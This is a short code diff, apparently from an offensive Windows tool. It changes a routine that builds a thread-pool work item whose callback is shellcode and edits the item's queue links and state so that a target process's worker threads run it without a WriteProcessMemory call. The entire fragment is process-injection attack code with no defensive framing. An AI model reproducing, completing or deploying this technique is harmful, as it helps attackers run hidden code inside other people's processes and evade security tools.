@@ -94,13 +94,14 @@ void RemoteWorkItemInsertion::SetupExecution()
 	auto TaskQueueHighPriorityList = &Pool->TaskQueue[TP_CALLBACK_PRIORITY_HIGH]->Queue;
 
 	/* Allocate TP_WORK with a custom TP_POOL */
-	auto pWorkItem = ThreadPoolAllocateWork((PTP_WORK_CALLBACK)this->ShellcodeAddress, NULL, TP_CALLBACK_PRIORITY_HIGH, (PFULL_TP_POOL)this->WorkerFactoryInformation.StartParameter);
-	
+	auto pWorkItem = w_CreateThreadpoolWork((PTP_WORK_CALLBACK)this->ShellcodeAddress, NULL, NULL);
+
 	/* 
 		When a task is posted NTDLL would insert the task to the pool task queue list tail
 		To avoid using WriteProcessMemory later on to post the task, we modify the work item's properties as if it was already "posted"
 		In addition we make the work item exchangable so that ntdll!TppWorkerThread will process it correctly
 	*/
+	pWorkItem->CleanupGroupMember.Pool = (PFULL_TP_POOL)this->WorkerFactoryInformation.StartParameter;
 	pWorkItem->Task.ListEntry.Flink = TaskQueueHighPriorityList;
 	pWorkItem->Task.ListEntry.Blink = TaskQueueHighPriorityList;
 	pWorkItem->WorkState.Exchange = 0x2;
